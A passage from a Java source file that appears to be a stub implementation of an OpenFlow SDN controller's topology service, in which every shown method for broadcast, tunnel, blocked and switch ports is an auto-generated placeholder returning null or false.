			OFPort srcPort) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public Set<OFPort> getBroadcastPorts(DatapathId targetSw, DatapathId src,
			OFPort srcPort, boolean tunnelEnabled) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public boolean isIncomingBroadcastAllowed(DatapathId sw, OFPort portId) {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	public boolean isIncomingBroadcastAllowed(DatapathId sw, OFPort portId,
			boolean tunnelEnabled) {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	public NodePortTuple getOutgoingSwitchPort(DatapathId src, OFPort srcPort,
			DatapathId dst, OFPort dstPort) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public NodePortTuple getOutgoingSwitchPort(DatapathId src, OFPort srcPort,
			DatapathId dst, OFPort dstPort, boolean tunnelEnabled) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public NodePortTuple getIncomingSwitchPort(DatapathId src, OFPort srcPort,
			DatapathId dst, OFPort dstPort) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public NodePortTuple getIncomingSwitchPort(DatapathId src, OFPort srcPort,
			DatapathId dst, OFPort dstPort, boolean tunnelEnabled) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public NodePortTuple getAllowedOutgoingBroadcastPort(DatapathId src,
			OFPort srcPort, DatapathId dst, OFPort dstPort) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public NodePortTuple getAllowedOutgoingBroadcastPort(DatapathId src,
			OFPort srcPort, DatapathId dst, OFPort dstPort,
			boolean tunnelEnabled) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public NodePortTuple getAllowedIncomingBroadcastPort(DatapathId src,
			OFPort srcPort) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public NodePortTuple getAllowedIncomingBroadcastPort(DatapathId src,
			OFPort srcPort, boolean tunnelEnabled) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public Set<NodePortTuple> getBroadcastDomainPorts() {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public Set<NodePortTuple> getTunnelPorts() {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public Set<NodePortTuple> getBlockedPorts() {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public Set<OFPort> getPorts(DatapathId sw) {
		// TODO Auto-generated method stub
		return null;
	}
}
